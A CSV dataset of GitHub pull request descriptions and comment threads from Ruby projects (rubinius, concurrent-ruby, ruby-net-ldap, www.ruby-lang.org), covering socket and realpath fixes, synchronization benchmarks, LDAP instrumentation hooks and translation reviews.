,gh_project_name,gh_pull_req_num,gh_pr_original_comment,gh_comments
619,rubinius/rubinius,1786.0,"Also implements Rational#round

Two of the specs (regarding the edge-case precision values of -1_999_999 and 2_097_171, lines 42-49 of spec/ruby/shared/rational/round.rb) have some perf problems. The former takes ~8 seconds, the latter takes ~3.

I left these on at the advice of @dbussink on IRC. I'll be working on making those go faster next, probably.

","['This pull request [fails](http://travis-ci.org/rubinius/rubinius/builds/1655180) (merged dc50f958 into a8d53e40).', 'This pull request [passes](http://travis-ci.org/rubinius/rubinius/builds/1655404) (merged fd340f63 into a8d53e40).', 'This pull request [passes](http://travis-ci.org/rubinius/rubinius/builds/1655584) (merged d2150bd7 into a8d53e40).', 'This pull request [passes](http://travis-ci.org/rubinius/rubinius/builds/1656956) (merged 836d8824 into a8d53e40).', 'This pull request [passes](http://travis-ci.org/rubinius/rubinius/builds/1657223) (merged 43930671 into a8d53e40).', 'This pull request [passes](http://travis-ci.org/rubinius/rubinius/builds/1657362) (merged c2e17f5f into a8d53e40).', 'This pull request [passes](http://travis-ci.org/rubinius/rubinius/builds/1657497) (merged edd447ff into a8d53e40).']"
620,rubinius/rubinius,2014.0,"Socket#socketpair `type` argument can accept
a symbol that references to a `Socket::SOCK_*`
constant.

    require 'socket'

    # Before

    Socket.socketpair(Socket::PF_UNIX, Socket::SOCK_DGRAM, 0)
    # => [#<Socket:fd 11>, #<Socket:fd 12>]

    Socket.socketpair(Socket::PF_UNIX, :DGRAM, 0)
    # => TypeError: Tried to use non-reference value 0x15a86 as type Bignum (10)

    # After

    Socket.socketpair(Socket::PF_UNIX, Socket::SOCK_DGRAM, 0)
    # => [#<Socket:fd 7>, #<Socket:fd 8>]
    Socket.socketpair(Socket::PF_UNIX, :DGRAM, 0)
    # => [#<Socket:fd 9>, #<Socket:fd 10>]

Fixes #2011.","[""Obviously, this is not finished. I'm new to Rubinius and I'm starting to use it in development. I read the contributing guide and I know that I have to add specs for this (I'll investigate how to do it). If someone has a better fix, please send it!\r\n\r\nAnyway, I just want it to give it a try :)"", 'I added some specs. Any feedback will be welcome :)\r\n\r\n```\r\nfrodsan$ mspec spec/ruby/library/socket/socket/pair_spec.rb \r\nrubinius 2.0.0rc1 (1.9.3 2242f14b 2012-11-02 JI) [x86_64-apple-darwin12.2.0]\r\n...\r\n\r\nFinished in 0.027147 seconds\r\n\r\n1 file, 3 examples, 7 expectations, 0 failures, 0 errors\r\n```', 'Did you also verify the behavior in 1.8 mode?', 'This is the behaviour in Ruby 1.8.7.\r\n\r\n```\r\n>> RUBY_VERSION\r\n=> ""1.8.7""\r\n>> require \'socket\'\r\n=> true\r\n>> Socket.socketpair(Socket::PF_UNIX, Socket::SOCK_DGRAM, 0)\r\n=> [#<Socket:0x109bfc750>, #<Socket:0x109bfc778>]\r\n>> Socket.socketpair(Socket::PF_UNIX, :DGRAM, 0)\r\nErrno::EPROTONOSUPPORT: Protocol not supported - socketpair(2)\r\n\tfrom (irb):3:in `socketpair\'\r\n\tfrom (irb):3\r\n```\r\n\r\nand this is with Rubinius -X18 mode:\r\n\r\n```\r\n>> require \'socket\'\r\n=> true\r\n>> Socket.socketpair(Socket::PF_UNIX, Socket::SOCK_DGRAM, 0)\r\n=> [#<Socket:0x1714>, #<Socket:0x1718>]\r\n>> Socket.socketpair(Socket::PF_UNIX, :DGRAM, 0)\r\nTypeError: Tried to use non-reference value 0xf26e as type Bignum (10)\r\n```\r\n\r\nWhat should I do? Thanks :)', ""Probably needs a similar check to see if it's a valid constant in 1.8 mode and throw a Errno::EPROTONOSUPPORT when it isn't one."", 'Something like this?\r\n\r\n```\r\n--- a/lib/18/socket.rb\r\n+++ b/lib/18/socket.rb\r\n@@ -682,6 +682,8 @@ class Socket < BasicSocket\r\n       else\r\n         raise SocketError, ""unknown socket type #{type}""\r\n       end\r\n+    elsif !type.kind_of? Integer\r\n+      raise SocketError, ""unknown socket type #{type}""\r\n     end\r\n \r\n     FFI::MemoryPointer.new :int, 2 do |mp|\r\n```\r\n\r\nResult:\r\n\r\n```\r\n>> Socket.socketpair(Socket::PF_UNIX, :DGRAM, 0)\r\nSocketError: unknown socket type DGRAM\r\n```', 'Well, we should raise the same exception as MRI. And we should also add a spec for that then', ""@dbussink Updated. I can't run the tests in X18 mode yet :(\r\n\r\n```\r\n$ RBXOPT=-X18 bin/mspec spec/ruby/library/socket/socket/socketpair_spec.rb\r\nrubinius 2.0.0rc1 (1.9.3 6b18a0e4 2012-11-02 JI) [x86_64-apple-darwin12.2.0]\r\n...\r\n\r\nFinished in 0.018068 seconds\r\n\r\n1 file, 3 examples, 7 expectations, 0 failures, 0 errors\r\n```\r\n"", ""Oops ... I misinterpreted the documentation:\r\n\r\n```\r\n./configure --enable-version=1.9,2.0 --default-version=1.9\r\n```\r\n\r\nI didn't enable 1.8 mode. Now, works fine. Thanks :+1:\r\n\r\n```\r\n$ RBXOPT=-X18 bin/mspec spec/ruby/library/socket/socket/pair_spec.rb \r\nrubinius 2.0.0rc1 (1.8.7 927ff0e8 2012-11-02 JI) [x86_64-apple-darwin12.2.0]\r\n..\r\n\r\nFinished in 0.022539 seconds\r\n\r\n1 file, 2 examples, 2 expectations, 0 failures, 0 errors\r\n```"", 'I strongly suggest not changing configure options when developing on Rubinius, to prevent issues such as these. Also could you please split the changes for 1.8 mode in a separate commit for the spec addition? Just like the changes for 1.9 mode.', 'Done.', 'Thnx!', '@frodsan Thanks :-) ']"
621,rubinius/rubinius,2066.0,,"['The spec/core/ffi files are from before the spec/ruby/optional/ffi specs. The spec/core/ffi specs are deprecated and will be removed. Could you ensure that the specs are in spec/ruby/optional/ffi or add them?', ""Thank you @brixen \r\n\r\nI've just added FFI::Platform specs. (git question: is this right to rebase before adding some commits for you?)"", '@nibua-r yes, please rebase to master HEAD.', ""@brixen Isn't it what I have done?"", ""@nibua-r I'm not sure, looks weird here. I'll merge manually."", ""Thanks @brixen That's strange, I'll check that back at home."", ""Strange. Anyway, thank you. I'll check if some action is required when back aT home.\r\n\r\n\r\nBrian Ford <notifications@github.com> a \xc3\xa9crit\xc2\xa0:\r\n\r\n>@nibua-r I'm not sure, looks weird here. I'll merge manually.\r\n>\r\n>---\r\n>Reply to this email directly or view it on GitHub:\r\n>https://github.com/rubinius/rubinius/pull/2066#issuecomment-10922297\r\n\r\n-- \r\nEnvoy\xc3\xa9 de mon t\xc3\xa9l\xc3\xa9phone Android avec K-9 Mail. Excusez la bri\xc3\xa8vet\xc3\xa9."", ""One more thing, apparently you changed / touched lib/ext/melbourne/grammar18.cpp, that's probably not intended."", ""I'm really sorry I'll fix this ASAP\r\n\r\n\r\nDirkjan Bussink <notifications@github.com> a \xc3\xa9crit\xc2\xa0:\r\n\r\n>One more thing, apparently you changed / touched\r\n>lib/ext/melbourne/grammar18.cpp, that's probably not intended.\r\n>\r\n>---\r\n>Reply to this email directly or view it on GitHub:\r\n>https://github.com/rubinius/rubinius/pull/2066#issuecomment-10927824\r\n\r\n-- \r\nEnvoy\xc3\xa9 de mon t\xc3\xa9l\xc3\xa9phone Android avec K-9 Mail. Excusez la bri\xc3\xa8vet\xc3\xa9."", 'Should be fixed now.']"
622,rubinius/rubinius,2106.0,"Evaluates now, which encoding should be used while merging strings.
Throws an error, if no compatible encoding could be found.
",[]
623,rubinius/rubinius,2252.0,"Currently File.realpath fails reading relative symlinks.
It uses Dir.pwd to expand file path, while it should use current link path.
For example, when using homebrew:
`` irb(main):003:0*   File.realpath('/usr/local/opt/rbenv')
Errno::ENOENT: No such file or directory - /Users/andriy/dev/Cellar/rbenv/0.4.0
	from kernel/common/file19.rb:128:in `realpath'
	from (irb):3
	from kernel/common/block_environment.rb:75:in `call_on_instance'
	from kernel/common/eval.rb:75:in `eval'
	from kernel/common/kernel19.rb:42:in `loop'
	from kernel/bootstrap/proc.rb:22:in `call'
	from kernel/common/throw_catch19.rb:8:in `catch'
	from kernel/common/throw_catch.rb:10:in `register'
	from kernel/common/throw_catch19.rb:7:in `catch'
	from kernel/bootstrap/proc.rb:22:in `call'
	from kernel/common/throw_catch19.rb:8:in `catch'
	from kernel/common/throw_catch.rb:10:in `register'
	from kernel/common/throw_catch19.rb:7:in `catch'
	from kernel/common/codeloader.rb:212:in `require'
	from kernel/common/kernel.rb:638:in `gem_original_require (require)'
	from /Users/andriy/dev/rubinius/lib/rubygems/custom_require.rb:36:in `require'
	from kernel/loader.rb:681:in `irb'
	from kernel/loader.rb:817:in `main'irb(main):004:0> 
``
","['Ok, one general issue remaining. Could you please split up commits to spec/ from commits to other code? This makes merging stuff back into rubyspec a lot easier for us.', 'Done.', 'Thanks!']"
624,rubinius/rubinius,2307.0,,[]
625,rubinius/rubinius,2386.0,The journey of encoding support goes on for ever and ever..,[]
626,rubinius/rubinius,2402.0,"Specs based on docs (http://www.ruby-doc.org/core-2.0/ThreadGroup.html) and running MRI 1.9.3.

I think this will fix #2389","[""I also cleaned up the extra blank lines I inadvertently added. You didn't comment on them, but they weren't consistent with the other code I looked at.""]"
627,rubinius/rubinius,2475.0,,['Thank you!']
628,rubinius/rubinius,2484.0,,"['Thank you!', 'Thanks for working on all these fixes :)']"
629,rubinius/rubinius,2516.0,"Turns out there were many tags without the corresponding tests.
Also, a few tests were tagged as failing, but were actually passing.
Left out unstable ones about threads and external environment encoding.
There might be some I didn't know they're unstable/unsafe to delete, if so, please let me know.",[]
630,rubinius/rubinius,2491.0,"Tricky behavior, but that's how MRI does it. :grin:
As always, feedback is very welcome.","['Hmmm, the point @kachick makes is a good one. This is bound to be confusing and changing Rubinius::Type.object_respond_to? means we also change behavior in for existing use cases. How about adding a helper method for just the Array case and leaving Rubinius::Type.object_respond_to? as it works now by making sure it mimics Kernel#respond_to? behavior?', 'Btw, I do think having the additional argument for Rubinius::Type.object_respond_to? is useful to have, like for Kernel#respond_to?', '>How about adding a helper method for just the Array case and leaving Rubinius::Type.object_respond_to? as it works now by making sure it mimics Kernel#respond_to? behavior?\r\n\r\nTotally agree. Will rework the patch soon. Thanks for the fantastic feedback. :)']"
631,ruby-concurrency/concurrent-ruby,284.0,"- Add `ns_initialize` for ivars setting  inside synchronize block
- cleans up the Synchronization::Object space
- add `ensure_ivar_visibility!` for final fields
- add volatile attributes","['After applying the new capabilities of `Synchronization::Object` to `Edge::Future` on the obvious places the performance improved. It now has better or same performance as old implementations.\r\n```txt\r\nCalculating -------------------------------------\r\n           value-old    19.844k i/100ms\r\n           value-new    21.473k i/100ms\r\n-------------------------------------------------\r\n           value-old    300.837k (\xc2\xb113.9%) i/s -      2.937M\r\n           value-new    295.720k (\xc2\xb118.5%) i/s -      2.813M\r\n\r\nComparison:\r\n           value-old:   300836.7 i/s\r\n           value-new:   295720.0 i/s - 1.02x slower\r\n\r\nCalculating -------------------------------------\r\n           graph-old    59.000  i/100ms\r\n           graph-new   231.000  i/100ms\r\n-------------------------------------------------\r\n           graph-old    777.004  (\xc2\xb132.9%) i/s -      6.431k\r\n           graph-new      2.211k (\xc2\xb125.2%) i/s -     20.328k\r\n\r\nComparison:\r\n           graph-new:     2211.0 i/s\r\n           graph-old:      777.0 i/s - 2.85x slower\r\n\r\nCalculating -------------------------------------\r\n       immediate-old   924.000  i/100ms\r\n       immediate-new   969.000  i/100ms\r\n-------------------------------------------------\r\n       immediate-old      9.124k (\xc2\xb123.4%) i/s -     84.084k\r\n       immediate-new      9.134k (\xc2\xb124.7%) i/s -     82.365k\r\n\r\nComparison:\r\n       immediate-new:     9133.6 i/s\r\n       immediate-old:     9123.7 i/s - 1.00x slower\r\n\r\nCalculating -------------------------------------\r\n            then-old   402.000  i/100ms\r\n            then-new   410.000  i/100ms\r\n-------------------------------------------------\r\n            then-old      4.306k (\xc2\xb128.2%) i/s -     36.984k\r\n            then-new      4.506k (\xc2\xb127.1%) i/s -     40.590k\r\n\r\nComparison:\r\n            then-new:     4505.6 i/s\r\n            then-old:     4306.2 i/s - 1.05x slower\r\n```\r\nBefore with only `synchronize` it was:\r\n```txt\r\nCalculating -------------------------------------\r\n           value-old    17.623k i/100ms\r\n           value-new    11.537k i/100ms\r\n-------------------------------------------------\r\n           value-old    293.436k (\xc2\xb115.9%) i/s -      2.837M\r\n           value-new    254.683k (\xc2\xb113.1%) i/s -      2.504M\r\n\r\nComparison:\r\n           value-old:   293436.4 i/s\r\n           value-new:   254682.8 i/s - 1.15x slower\r\n\r\nCalculating -------------------------------------\r\n           graph-old    73.000  i/100ms\r\n           graph-new   237.000  i/100ms\r\n-------------------------------------------------\r\n           graph-old    863.588  (\xc2\xb126.5%) i/s -      7.592k\r\n           graph-new      2.502k (\xc2\xb118.0%) i/s -     23.700k\r\n\r\nComparison:\r\n           graph-new:     2501.6 i/s\r\n           graph-old:      863.6 i/s - 2.90x slower\r\n\r\nCalculating -------------------------------------\r\n       immediate-old   956.000  i/100ms\r\n       immediate-new   678.000  i/100ms\r\n-------------------------------------------------\r\n       immediate-old      9.920k (\xc2\xb121.0%) i/s -     92.732k\r\n       immediate-new      6.752k (\xc2\xb113.1%) i/s -     65.766k\r\n\r\nComparison:\r\n       immediate-old:     9919.6 i/s\r\n       immediate-new:     6752.0 i/s - 1.47x slower\r\n\r\nCalculating -------------------------------------\r\n            then-old   518.000  i/100ms\r\n            then-new   519.000  i/100ms\r\n-------------------------------------------------\r\n            then-old      5.312k (\xc2\xb123.5%) i/s -     48.174k\r\n            then-new      4.431k (\xc2\xb119.5%) i/s -     41.520k\r\n\r\nComparison:\r\n            then-old:     5312.2 i/s\r\n            then-new:     4431.2 i/s - 1.20x slower\r\n```', 'Documentation added, see https://github.com/ruby-concurrency/concurrent-ruby/blob/synchronization/doc/synchronization.md', ':+1: ', "":+1: I'm :ok_hand: with merging this. I'll rebase and continue working on #271, #283, and #280 afterwards."", ""Unfortunately there is an almost consistently failing test in rbx, I'll try to fix it first and then I'll merge."", ""The failing test is not using `Synchronized::Object` and I cannot get it reproduced :/ If It succeeds at least once on travis I'll merge this branch and add it to intermittently failing tests. "", ""I would prefer to merge this branch then work on the failing test afterwards:\r\n\r\n1. This code needs to be in master for is to proceed with our other work\r\n1. As noted, the failing test appears to be unrelated to the changes in this PR\r\n1. I spent over an hour the other day trying to get Rbx to install on an Ubuntu laptop and wasn't successful, so fixing this test may be very difficult"", 'Merging since travis gave a different intermittent error.', ':+1: ', ""I was able to install Rbx on my MacBook Pro and I've been unable to reproduce the failed test. I think it's safe to call this an intermittent failure and add it to the list."", '@jdantonio added.']"
632,ruby-ldap/ruby-net-ldap,101.0,"This PR works to add hooks for instrumentation/logging around network calls.

This specific implementation works well with [`ActiveSupport::Notifications`](http://api.rubyonrails.org/classes/ActiveSupport/Notifications.html) but does not depend on it, only on an object that responds to `instrument(event_name, payload, &block)` (like the `MockInstrumentationService` for the tests).

This wraps the new private methods `Net::LDAP::Connection#read` and `Net::LDAP::Connection#write`.

Thoughts?
","['Might need help with figuring out why jruby-1.9 is failing: https://travis-ci.org/ruby-ldap/ruby-net-ldap/jobs/33450895\r\n', ""Guess it's been failing consistently: https://travis-ci.org/ruby-ldap/ruby-net-ldap/builds"", 'Thinking about this as a way to get information about the content length on read:\r\n\r\n``` diff\r\ndiff --git a/lib/net/ber/ber_parser.rb b/lib/net/ber/ber_parser.rb\r\nindex 682a599..47379b8 100644\r\n--- a/lib/net/ber/ber_parser.rb\r\n+++ b/lib/net/ber/ber_parser.rb\r\n@@ -160,6 +160,7 @@ module Net::BER::BERParser\r\n     if -1 == content_length\r\n       raise Net::BER::BerError, ""Indeterminite BER content length not implemented.""\r\n     else\r\n+      yield id, content_length if block_given?\r\n       data = read(content_length)\r\n     end\r\n \r\ndiff --git a/lib/net/ldap.rb b/lib/net/ldap.rb\r\nindex 234a0a3..7c4c396 100644\r\n--- a/lib/net/ldap.rb\r\n+++ b/lib/net/ldap.rb\r\n@@ -1268,14 +1268,17 @@ class Net::LDAP::Connection #:nodoc:\r\n   end\r\n \r\n   def read(syntax = Net::LDAP::AsnSyntax)\r\n-    instrument ""read.net_ldap_connection"", :syntax => syntax do\r\n-      @conn.read_ber(syntax)\r\n+    instrument ""read.net_ldap_connection"", :conn => @conn, :syntax => syntax do |payload|\r\n+      @conn.read_ber(syntax) do |id, content_length|\r\n+        payload[:response_id]    = id\r\n+        payload[:content_length] = content_length\r\n+      end\r\n     end\r\n   end\r\n   private :read\r\n \r\n   def write(packet)\r\n-    instrument ""write.net_ldap_connection"", :packet => packet do\r\n+    instrument ""write.net_ldap_connection"", :conn => @conn, :packet => packet do\r\n       @conn.write(packet)\r\n     end\r\n   end\r\n```\r\n', 'Specifically, the `@conn.read_ber` call with a block.\r\n', ""@schaary would love some feedback on whether this will be considered for release or if I should instead maintain my own fork. Not sure what your contribution policies are, if they've changed since the last substantive `Hacking.rdoc` changes, if this repo is mostly in maintenance mode, etc. Any feedback appreciated.\r\n"", ""Still need to update docs and instrument other methods similar to `search`. I'm also happy to extract unrelated changes (such as using the `Net::LDAP::PDU::RequestOrResponseConstant` instead of equivalent integers) if that makes this easier to accept.\r\n"", ""This looks interesting\xe2\x80\x94I'm not deep in the code enough to act on it myself, but this should probably be considered as I recall seeing a number of performance issues raised over time, and this should make it easier to find.\r\n\r\nI also agree with your general commentary about repeated complex stanzas, @mtodd."", ""I realized that there were a couple unrelated changes merged into this branch (because I was reusing this branch to do work in github/ruby-net-ldap) from https://github.com/ruby-ldap/ruby-net-ldap/pull/102 and https://github.com/ruby-ldap/ruby-net-ldap/pull/103. I'm happy to fix that, though if those two PRs get merged before this, it should reduce the diff here (this is the route I would recommend).\r\n\r\nAny specific feedback that I can get working on here to get this into a state for merging? Any relevant documentation you feel is missing?\r\n""]"
633,ruby/www.ruby-lang.org,528.0,,"[""@namsk Could you review this and #531 , #532 , #533 ?\r\n\r\nI can't review Korean language."", '@hsbt \r\nI got it.\r\nGive me some time to review.\r\nI will review in order.\r\n\r\nThanks.', '@marocchino \r\nI added some line comment at File Changed tab.\r\nI found a bad link but original en page has same error. I will add issue for it.\r\nThanks.', ""Ok, did it. :)\r\nAnd If you don't mind, I want merge this before resolve issue #587 ."", '@marocchino \r\nThank you.']"
634,ruby/www.ruby-lang.org,684.0,rel to #681,"['@ruby/www-ruby-lang-org-i18n-ja :eyeglasses:?', '@sorah @takahashim Could I merge it?', ':+1: ', 'Looks good!', 'Thank you for reviewing!']"
635,ruby/www.ruby-lang.org,725.0,@ruby/www-ruby-lang-org-i18n-it please review! :octocat: ,"['@ruby/www-ruby-lang-org-i18n-it everything should be fixed now. Waiting your approval to merge! Thanks!', ':+1: ']"
636,ruby/www.ruby-lang.org,770.0,"@ruby/www-ruby-lang-org-i18n-fr on s'est un peu relâché sur Mai :do_not_litter: 

Si quelqu'un pouvait relire et valider, je lui en saurais gré !

Merci.

---

We forgot about May :do_not_litter: 

If one of you could review and validate this, I'd be glad!

Thanks.","['Bonjour @chikamichi, thanks for your news translation. Please describe your Pull Request in English so that other people could understand and help. :smiley: \r\n\r\nMerci beaucoup!', 'Thank you for your review, @chatgris.']"
637,ruby/www.ruby-lang.org,829.0,"Hi,

This is a french translation for the latest news.

I think some parts are perfectible.

Best regards.","['@GRoguelon Thanks for yours contributions! :tada:', 'I amended the comments except ```biblioth\xc3\xa8que``` I think it must be pluralized.\r\n\r\ncc @chatgris ', 'Done!', '@GRoguelon thx for the PR.']"
638,ruby/www.ruby-lang.org,983.0,,['@namsk review please.']
